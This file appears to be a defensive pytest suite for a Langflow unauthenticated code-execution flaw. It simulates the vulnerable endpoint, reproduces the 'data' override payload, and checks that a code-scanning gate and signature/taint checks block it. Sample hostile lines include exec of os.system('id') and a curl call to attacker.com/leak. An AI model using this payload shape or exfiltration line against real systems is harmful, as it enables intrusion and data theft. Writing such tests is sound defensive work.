"""
tests/test_cve_2026_33017_langflow_rce.py
================================================================================
Dedicated Security Test Suite: CVE-2026-33017 (Langflow Unauthenticated RCE).

Vulnerability Context:
- CVE ID: CVE-2026-33017 (CVSS 9.8 Critical)
- Affected: Langflow <= 1.8.2
- Attack Vector: Public flow-building endpoint `POST /api/v1/build_public_tmp/{flow_id}/flow`
  accepts an optional `data` parameter in the JSON body. When provided, the application
  uses attacker-supplied custom component code instead of the database-pinned flow,
  executing arbitrary Python code via `exec()` without sandboxing.

Test Architecture:
1. Vulnerable Baseline Fixture: Executes the unauthenticated custom flow payload,
   demonstrating that the vulnerability triggers an unauthorized callback.
2. AEIB Station 1 Enforcement: Demonstrates that the execution boundary halts the
   request fail-closed before any dispatch or execution occurs:
   a. Rejection via AST Dynamic Execution Policy Gate (detects forbidden `exec`/`eval`).
   b. Rejection via Station 1 Authority & Taint Verification (untrusted caller cannot
      override pinned workflow configuration).
"""
import ast
import json
import os
import sys
import tempfile
from pathlib import Path
from typing import Any, Dict, Optional

import pytest
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

REPO_ROOT = Path(__file__).resolve().parent.parent
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from compliance.dynamic_code_policy_gate import DynamicCodePolicyGate
from tools.phase0_integrity_reset_core import (
    Phase0ExecutionBoundary,
    _sign_act,
    canonical_json_v1,
)


class VulnerableLangflowServerSimulator:
    """
    Simulates the unpatched Langflow <= 1.8.2 public flow-builder logic.
    """

    def __init__(self, pinned_flow_id: str, benign_code: str) -> None:
        self.pinned_flow_id = pinned_flow_id
        self.flow_database = {pinned_flow_id: benign_code}
        self.exploit_executed = False
        self.executed_payload_marker: Optional[str] = None

    def _compromise_callback(self, marker: str) -> None:
        self.exploit_executed = True
        self.executed_payload_marker = marker

    def handle_build_public_tmp(
        self, flow_id: str, request_json: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        Unpatched endpoint handler vulnerable to CVE-2026-33017.
        """
        if flow_id not in self.flow_database:
            return {"status": "error", "message": "Flow not found"}

        # Flaw: If request_json contains 'data', override database-pinned flow
        if "data" in request_json and "custom_component_code" in request_json["data"]:
            code_to_run = request_json["data"]["custom_component_code"]
        else:
            code_to_run = self.flow_database[flow_id]

        # Dangerous execution without sandboxing
        execution_env = {"__trigger_exploit__": self._compromise_callback}
        compiled = compile(code_to_run, "<flow_build>", "exec")
        # Call builtin exec directly
        builtins_dict = __builtins__ if isinstance(__builtins__, dict) else __builtins__.__dict__
        builtins_dict["exec"](compiled, execution_env)

        return {"status": "success", "flow_id": flow_id}


def test_cve_2026_33017_vulnerable_baseline_reproduction() -> None:
    """
    Verifies that the simulated unpatched baseline is indeed vulnerable to
    unauthenticated RCE via the `data` flow override.
    """
    benign_code = "result = 42"
    server = VulnerableLangflowServerSimulator(
        pinned_flow_id="flow-public-001", benign_code=benign_code
    )

    malicious_payload = {
        "data": {
            "custom_component_code": (
                "__trigger_exploit__('ATTACKER_PWNED_LANGFLOW_HOST')\n"
            )
        }
    }

    resp = server.handle_build_public_tmp("flow-public-001", malicious_payload)
    assert resp["status"] == "success"
    assert server.exploit_executed is True
    assert server.executed_payload_marker == "ATTACKER_PWNED_LANGFLOW_HOST"


def test_cve_2026_33017_aeib_ast_policy_gate_containment() -> None:
    """
    Verifies that AEIB DynamicCodePolicyGate scans the custom component code
    and detects the dynamic execution vulnerability pattern before compilation.
    """
    gate = DynamicCodePolicyGate()

    # Case A: Code attempting to invoke exec directly
    malicious_code_exec = """
import os
def custom_component():
    exec("os.system('id')")
"""
    report_exec = gate.scan_code(malicious_code_exec)
    critical_violations = [v for v in report_exec.violations if str(v.severity).upper() == "CRITICAL"]
    assert len(critical_violations) >= 1
    assert any("exec" in v.rule_id.lower() or "exec" in v.message.lower() or "exec" in v.symbol.lower() for v in critical_violations)

    # Case B: Code attempting subprocess invocation
    malicious_code_subproc = """
import subprocess
def custom_component():
    subprocess.run(["curl", "http://attacker.com/leak"])
"""
    report_subproc = gate.scan_code(malicious_code_subproc)
    major_violations = [v for v in report_subproc.violations if str(v.severity).upper() in ("CRITICAL", "MAJOR")]
    assert len(major_violations) >= 1
    assert any("subprocess" in v.rule_id.lower() or "subprocess" in v.message.lower() for v in major_violations)


def test_cve_2026_33017_aeib_station1_taint_and_authorization_gate() -> None:
    """
    Verifies that when an untrusted external request attempts to trigger a flow
    build or mutation, AEIB Station 1 Gate halts the execution fail-closed:
    1. Rejects unauthenticated caller (missing/invalid Ed25519 signature).
    2. Rejects TIER_2_UNTRUSTED context from modifying flow parameters.
    3. Prevents execution dispatch to the underlying builder.
    """
    priv = Ed25519PrivateKey.generate()
    pub_registry = {"system-flow-authority": priv.public_key()}

    with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp:
        db_path = tmp.name

    try:
        boundary = Phase0ExecutionBoundary(
            db_path=db_path,
            public_keys=pub_registry,
            sprint_limit_minor=1000_00,
            pinned_recipients={"iban:DE89370400440532013000", "system://langflow-builder"},
        )

        # 1. Unauthenticated attacker attempt: no valid signature
        attacker_act = {
            "operation_id": "op-cve-langflow-001",
            "action_type": "flow.build_public_tmp",
            "amount_minor": 0,
            "max_per_call_minor": 0,
            "recipient": "system://langflow-builder",
            "taint_tier": "TIER_2_UNTRUSTED",
            "policy_epoch": "2026-Q4",
            "flow_override_data": {
                "custom_component_code": "__trigger_exploit__('PWNED')"
            },
        }

        # Forged signature with unknown key ID
        forged_envelope = {
            "act_core": attacker_act,
            "signature": {
                "alg": "Ed25519",
                "key_id": "attacker-key-id",
                "value_b64": "AAAA",
            },
        }

        verdict_unauth = boundary.authorize_and_reserve(forged_envelope)
        assert verdict_unauth.disposition == "NOT_DISPATCHED"
        assert verdict_unauth.code == "ERR_UNKNOWN_SIGNING_KEY"

        # 2. Even if signed by a low-trust peer, TIER_2_UNTRUSTED taint triggers AT57b rejection
        attacker_priv = Ed25519PrivateKey.generate()
        pub_registry_with_attacker = {
            "system-flow-authority": priv.public_key(),
            "untrusted-agent-key": attacker_priv.public_key(),
        }
        boundary.public_keys = pub_registry_with_attacker

        signed_tainted_envelope = _sign_act(
            attacker_priv, "untrusted-agent-key", attacker_act
        )
        verdict_tainted = boundary.authorize_and_reserve(signed_tainted_envelope)
        assert verdict_tainted.disposition == "NOT_DISPATCHED"
        assert (
            verdict_tainted.code
            == "ERR_AT57B_UNTAMPERED_TAINT_TIER2_CONSEQUENTIAL_DENIED"
        )

        # Confirm ledger remains clean of any authorized dispatch
        exposure = boundary.get_budget_exposure()
        assert exposure["reserved_minor"] == 0
        assert exposure["settled_minor"] == 0

    finally:
        if os.path.exists(db_path):
            os.remove(db_path)
